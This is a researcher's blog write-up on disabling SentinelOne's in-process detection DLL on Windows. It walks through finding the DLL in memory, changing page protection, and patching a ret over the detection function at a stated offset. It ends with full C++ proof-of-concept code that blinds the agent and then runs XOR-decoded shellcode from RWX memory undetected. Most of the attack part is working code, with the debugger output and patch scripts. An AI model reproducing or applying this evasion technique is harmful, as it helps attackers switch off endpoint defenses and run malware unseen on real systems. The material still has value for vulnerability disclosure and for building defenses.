---
layout: default
---
<br/>
# SentinelOne Agent Bypass
<hr/>

## What is this?
This is a write-up describing the discovery and exploitation of a vulnerability in Sentinel Agent, the in-process monitoring component of the SentinelOne platform.

<br/>
<hr/>

## SentinelOne
SentinelOne is a cybersecurity platform known for its robust Endpoint Detection and Response (EDR) capabilities. It utilizes AI and machine learning to deliver real-time threat detection, automated response, and full visibility into endpoint activities.

SentinelOne is widely adopted across various industries due to its effectiveness in handling sophisticated attacks, ease of deployment, and comprehensive threat intelligence capabilities. Its ability to autonomously detect and respond to threats without manual intervention sets it apart as a leader in the EDR space.

*(ChatGPT)*

<br/>
<hr/>

## The Vulnerability
Successful exploitation of the vulnerability blinds the in-process detection, meaning you can run even the most toxic shellcode (e.g., meterpreter) without it getting detected. You can also remotely blind processes and inject into them, also without detection.

<br/>
<hr/>

## In-Process Detection
When the system boots, SentinelOne's kernel driver (`SentinelMonitor.sys`) is loaded. This driver calls the `PsSetCreateProcessNotifyRoutine()` Windows API to tell Windows that it wants to be notified every time a new process is created.

Now, whenever a new process is created, the driver is notified, and it has the opportunity to perform some tasks as part of the process creation. One of these tasks is injecting a DLL into the newly created process. This DLL is named `InProcessClient64.dll` on x64 systems and its purpose is to monitor the process for threats. It performs numerous timer- or event-driven tasks such as scanning memory for threats and watching for suspicious memory operations and network connections.

If we use WinDbg to debug notepad.exe, we can see this DLL loaded alongside all the other modules in the process:
```
0:000> lm
start             end                 module name
00007ff6`2e580000 00007ff6`2e5da000   notepad    (deferred)             
00007ffd`f8c10000 00007ffd`f8ea2000   COMCTL32   (deferred)             
00007ffe`14a80000 00007ffe`14e96000   InProcessClient64   (deferred)
00007ffe`151e0000 00007ffe`15208000   bcrypt     (deferred)             
00007ffe`15380000 00007ffe`15491000   ucrtbase   (deferred)             
00007ffe`154a0000 00007ffe`1585a000   KERNELBASE   (deferred)             
...snip...
```

We can get some information about the DLL:
```
0:000> lmDvm InProcessClient64
start             end                 module name
00007ffe`14a80000 00007ffe`14e96000   InProcessClient64   (deferred)             
    Image path: C:\Program Files\SentinelOne\Sentinel Agent 24.1.4.257\InProcessClient64.dll
    Image name: InProcessClient64.dll
    Timestamp:        Thu Sep 26 15:37:12 2024 (66F5B7E8)
    CheckSum:         0040B65F
    ImageSize:        00416000
    File version:     24.1.4.257
    Product version:  24.1.4.257
    File type:        2.0 Dll
    Information from resource tables:
        CompanyName:      SentinelOne, Inc.
        ProductName:      Sentinel Agent
        InternalName:     WinHostDll
        OriginalFilename: WinHostDll.dll
        ProductVersion:   24.1.4.257
        FileVersion:      24.1.4.257
        FileDescription:  WinAgentHostDll
        LegalCopyright:   SentinelOne, Inc.
```

<br/>
<hr/>

## InProcessClient64.dll
Fortunately, developing this exploit did not require a deep understanding of how the DLL works or how it fits into the complex SentinelOne platform, just that certain functions in the DLL are called at certain times, some of which may be responsible for detecting threats. This was enough to give me an idea on how to approach exploiting it - if I could write to the DLL's memory, maybe I could influence its behavior (i.e. disable it).

<br/>
<hr/>

## Locating the Base Address
To be able to write to memory, the first task was to locate the base address of `InProcessClient64.dll`. Due to ASLR, this address will be different on every system, and after every reboot. I created a C++ console app in Visual Studio whose sole purpose (for now) was to attack the `InProcessClient64.dll` that gets injected into it when the process is created.

Using a combination of Windows APIs including `OpenProcess()`, `EnumProcessModules()`, `GetModuleInformation()`, and `GetModuleFileNameExA()`, it is possible to loop through the loaded modules in your process to look for one in particular.

Here is the code that loops through the loaded modules and looks for the one we're interested in. Note that I am not using the DLL's full name, which is probably not necessary, but is less likely to be seen as malicious if SentinelOne happens to be watching for something like this.

```c
    HMODULE hModules[1024];
    DWORD cbNeeded = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());

    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
    {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
        {
            MODULEINFO modInfo = { 0 };
            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
            {
                CHAR modName[MAX_PATH] = { 0 };
                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
                {
                    if (std::string(modName).find("cessClient6") != std::string::npos)
                    {
                        // we have found the InProcessClient64.dll module, so now we can grab its base address

                        QWORD base = (QWORD)modInfo.lpBaseOfDll;
                    }
                }
            }
        }
    }
```

<br/>
<hr/>

## Memory Protections
Now that I had the base address of the DLL, I could try actually writing to its memory. But where? As the write target, I chose `DllMain()`, the default entrypoint for DLLs. To find the location of this function, I used IDA Pro, which showed its offset as `0x32b0`, which means its virtual address is `0x32b0` plus the base address I just obtained. (For some reason IDA Pro is calling this function `DllEntryPoint()`. I don't know what that's about.)

![DllMain](/images/dllmain.png)

But first things first - before I could write memory, I needed to set the memory protection of this address to actually allow writing, since this region is marked as `PAGE_EXECUTE_READ` as can be seen in WinDbg:

![VirtualProtect](/images/vprotect2.png)

To modify memory protection, I used the `VirtualProtect()` Windows API. This function accepts the address whose protection you want to change, how many bytes, the new protection constant, and a place to store the old protection constant which is useful if you want to set it back to its original value when you're done, which I did.

So I modified the PoC to include the following code:

```c
    QWORD base = (QWORD)modInfo.lpBaseOfDll;  // base address of InProcessClient64.dll
    QWORD entrypoint = base + 0x32b0;         // virtual address of the entrypoint (base plus offset)
    DWORD oldProtect = 0;                     // stack variable to receive the previous protection

    printf("Write target: 0x%llx\n", (QWORD)entrypoint);

    if (VirtualProtect((LPVOID)entrypoint, 1, PAGE_READWRITE, &oldProtect))
    {
        printf("Success!\n");
        VirtualProtect((LPVOID)entrypoint, 1, oldProtect, &oldProtect);
    }
```

When I ran the updated PoC in WinDbg, I was able to verify that the protection for the target address had been changed to `PAGE_READWRITE`:

![VirtualProtect](/images/vprotect.png)

With the protection changed, I should now be able to write arbitrary values to the address of the entrypoint. When I did this originally, I fully expected SentinelOne to intervene and kill my process. I don't have a guess as to why SentinelOne allows you to do this.

<br/>
<hr/>

## Writing a Single Byte
At this point I tried writing a single byte to the target address (`DllMain()`). I updated the PoC to add a call to `RtlCopyMemory()` which will copy (write) my `\x90` to the target address. It didn't really matter what byte I chose here, I just needed to prove that I could write at all.

```c
    QWORD base = (QWORD)modInfo.lpBaseOfDll;  // base address of InProcessClient64.dll
    QWORD entrypoint = base + 0x32b0;         // virtual address of the entrypoint (base plus offset)
    DWORD oldProtect = 0;                     // stack variable to receive the previous protection

    printf("Write target: 0x%llx\n", (QWORD)entrypoint);

    if (VirtualProtect((LPVOID)entrypoint, 1, PAGE_READWRITE, &oldProtect))
    {
        printf("Success!\n");
        RtlCopyMemory((LPVOID)addr, "\x90", 1);
        VirtualProtect((LPVOID)entrypoint, 1, oldProtect, &oldProtect);
    }
```

I set a breakpoint right before the call to `RtlCopyMemory()` to examine the memory before writing. This is what the unmodified `DllMain()` looked like:

![before-write](/images/before-write.png)

I then let `RtlCopyMemory()` execute and examined the same address after the write operation:

![after-write](/images/after-write.png)

Success! There is the `nop` (`\x90`) instruction I wrote. I had now confirmed that I could write into `InProcessClient64.dll`'s memory.

<br/>
<hr/>

## Recap
I have the base address of `InProcessClient64.dll`, I've proven that I can call `VirtualProtect()` to set the protection of an address to `PAGE_READWRITE`, and I was able to write to memory with `RtlCopyMemory()`. The next task was to figure out what to write, and where.

<br/>
<hr/>

## RET
Since the goal was to blind SentinelOne, my theory was that if I could find the function that is responsible for performing the in-process monitoring, I could write a `ret` (`\xc3`) as its first instruction, which would end execution of the function and return to the address on the top of the stack, never reaching the code that would result in a detection. For example, if we pretend the name of the function was `FindMaliciousThings()`, I wanted it to look like this after I wrote my `ret` instruction:

```c
void FindMaliciousThings()
{
    return;
    ScanMemoryForThreats();
    ScanOtherStuffForThreats();
    FindThreatsAllOverThePlace();
}
```

When this function is called, it returns immediately without doing anything. This is the goal.

<br/>
<hr/>

## Function Hunting
Now that I know what I want to write (`ret`), all that was left was finding the function to "patch". The total number of functions in `InProcessClient64.dll` is 7,447, so I had my work cut out for me. I tried a few different ways to automate this task but ended up doing it manually. Notice that IDA Pro does not know the actual names of the functions since there is no debug information available for this DLL. Instead, it refers to functions as `sub_` and then the offset from the base, so `sub_2760` is `0x2760` bytes from the base address of `InProcessClient64.dll`.

![idafunc](/images/idafunc.png)

<br/>
<hr/>

## Patching with WinDbg
I used IDA Pro to export the list of all 7,447 functions to a text file, isolated the start address of each function, then split the list into chunks of 100. Instead of programmatically writing a `ret`, I could cheat and use WinDbg's `eb` command (edit byte) to quickly patch a `ret` instruction at each of the 100 functions in this batch.

For brevity, and if we pretend there were only 3 functions, I did something like this to create the WinDbg startup file:

```
user@kali:~$ cat funcs.txt
sub_2800        .text   0000000000002800        00000020        00000028                R
sub_2820        .text   0000000000002820        0000000C                        R       .       .
sub_2830        .text   0000000000002830        00000020        00000028                R
user@kali:~$ cat funcs.txt | awk '{print $3}' | while read f; do echo "eb inprocessclient64+${f} c3"; done | tee windbg.txt
eb inprocessclient64+0000000000002800 c3
eb inprocessclient64+0000000000002820 c3
eb inprocessclient64+0000000000002830 c3
user@kali:~$
```

Now when WinDbg starts, it will read this startup file and patch these 3 addresses with a `ret` (`\xc3`) instruction. Remember that I could (and will eventually) do this in C++, but it is simpler to let WinDbg do it since the goal now is to find out which function I need to patch to blind SentinelOne.

<br/>
<hr/>

## Malicious Code
At this point I switched my test application to one that tries to run the `windows/x64/messagebox` payload since it would certainly get detected as malicious.

The full code for the new test application was:
```c
static std::vector<char> unxor_file(const std::string& filename, char key)
{
    std::ifstream ifs(filename, std::ios::binary);
    std::vector<char> vec((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    std::for_each(vec.begin(), vec.end(), [key](char& c) { c ^= key; });

    return vec;
}

int main(int argc, char* argv[])
{
    std::string file("c:\\users\\user\\desktop\\msgbox.bin");
    auto bytes = unxor_file(file, 5);
    auto size = bytes.size();

    PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
    std::fill(bytes.begin(), bytes.end(), 0);
    bytes.clear();

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

There is nothing clever about this code. In fact, it is purposely not clever, because I am hoping that it will run undetected when the right function is patched with a `ret`. An observation with this code is that SentinelOne seems to be very gentle about on-disk detection. When this code is compiled, it produces an executable that most EDR products would flag as malicious, but not SentinelOne. Maybe the idea is that SentinelOne relies more heavily on its in-process detection.

<br/>
<hr/>

## Recap
I have created a WinDbg startup file that will patch a `ret` instruction as the first instruction of 100 functions per batch, causing these functions to return immediately. I will then run my malicious code (MessageBox shellcode) with these 100 functions patched. If SentinelOne detects threats, then none of those 100 were the right function. I will continue this process until SentinelOne does not detect threats, meaning one of those 100 functions was the right one. I will then pare down the list until I find the one function that is responsible for detecting threats.

<br/>
<hr/>

## Function Located
After a few batches of 100, I ran the malicious code and finally saw my messagebox stay on the screen. SentinelOne did not detect the shellcode this time! With a few more smaller batches, I was able to narrow it down to the single function responsible for detecting in-process threats: `sub_2ef60`.

![2ef60](/images/2ef60.png)

There's nothing obvious in this function that suggests it's especially important, but it does call three more functions which in turn may be responsible for in-process threat detection.

<br/>
<hr/>

## Blinding with Code
Now that I knew the address to write to (DLL base plus `0x2ef60`), I updated the PoC to write this memory programmatically instead of using WinDbg breakpoints:


```c
static std::vector<char> unxor_file(const std::string& filename, char key)
{
	std::ifstream ifs(filename, std::ios::binary);
	std::vector<char> vec((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
	std::for_each(vec.begin(), vec.end(), [key](char& c) { c ^= key; });

	return vec;
}

int main(int argc, char* argv[])
{
    HMODULE hModules[1024];
    DWORD cbNeeded = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());

    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
    {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
        {
            MODULEINFO modInfo = { 0 };
            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
            {
                CHAR modName[MAX_PATH] = { 0 };
                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
                {
                    if (std::string(modName).find("cessClient6") != std::string::npos)
                    {
                        DWORD oldProtect = 0;
                        QWORD addr = (QWORD)modInfo.lpBaseOfDll + 0x2ef60;

                        if (VirtualProtect((LPVOID)addr, 1, PAGE_READWRITE, &oldProtect))
                        {
                            RtlCopyMemory((LPVOID)addr, "\xc3", 1);
                            VirtualProtect((LPVOID)addr, 1, oldProtect, &oldProtect);
                        }
                    }
                }
            }
        }
    }

    auto bytes = unxor_file("c:\\users\\user\\desktop\\msgbox.bin", 5);
    auto size = bytes.size();

    PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
    std::fill(bytes.begin(), bytes.end(), 0);
    bytes.clear();

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

The first thing this code does is write a `ret` to the target address. It then performs the standard sequence of allocating RWX memory, copying shellcode, and creating a thread to run it. When this code is run, we get the messagebox, and SentinelOne has not raised any alerts.

![win2](/images/win2.png)

<br/>
<hr/>

